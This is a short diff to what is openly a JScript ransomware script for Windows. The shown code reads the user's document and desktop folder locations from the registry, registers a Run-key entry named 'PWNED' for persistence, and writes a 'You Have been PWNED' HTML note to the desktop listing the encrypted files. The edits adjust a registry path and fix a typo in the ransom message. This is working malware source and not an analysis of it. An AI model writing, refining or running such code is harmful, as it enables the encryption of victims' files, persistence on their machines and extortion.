@@ -3,7 +3,7 @@ var base64={};base64.PADCHAR='=';base64.ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg
 //
 var encryptor;
 var personalFolderRegistryEntry = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Personal';
-var encryptorRegistryEntry = 'HKLM\\e';
+var encryptorRegistryEntry = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\e';
 var fileNameToEncryptVar = 'fileNameToEncrypt';
 var processFlagReg = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\PWNED';
 var fso = new ActiveXObject('Scripting.FileSystemObject');
@@ -67,7 +67,7 @@ function finish() {
 	if(pwnedFileList.length > 0) {
 		var wsh = new ActiveXObject('WScript.Shell');
 		var path = wsh.RegRead('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Desktop') + '\\You Are PWNED.html';
-		var htmlBody = '<html><head><title>You have been PWNED !!!!!!!</title></head><body><h1>You Have been PWONED by ME !!!!</h1><h3>Following files are encrypted</h3><p>'+	pwnedFileList.join('<br/>') +'</p></body></html>';
+		var htmlBody = '<html><head><title>You have been PWNED !!!!!!!</title></head><body><h1>You Have been PWNED by ME !!!!</h1><h3>Following files are encrypted</h3><p>'+	pwnedFileList.join('<br/>') +'</p></body></html>';
 		var a = fso.CreateTextFile(path, true);
 		a.WriteLine(htmlBody);
 		a.Close();
